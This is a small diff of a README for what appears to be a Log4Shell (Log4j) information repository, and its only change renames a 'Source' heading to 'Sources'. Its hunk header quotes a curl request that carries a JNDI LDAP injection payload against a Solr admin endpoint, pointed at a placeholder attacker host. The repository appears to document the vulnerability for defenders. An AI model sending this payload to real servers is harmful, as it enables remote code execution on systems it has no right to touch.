@@ -92,7 +92,7 @@ curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.I
 | [software](software/README.md)     | Contains a list of known vulnerable and not vulnerable software |
 | [tools](tools/README.md)           | Contains a list of tools for automatically parsing info on this repo |
 
-## Source
+## Sources
 
 https://logging.apache.org/log4j/2.x/security.html
 
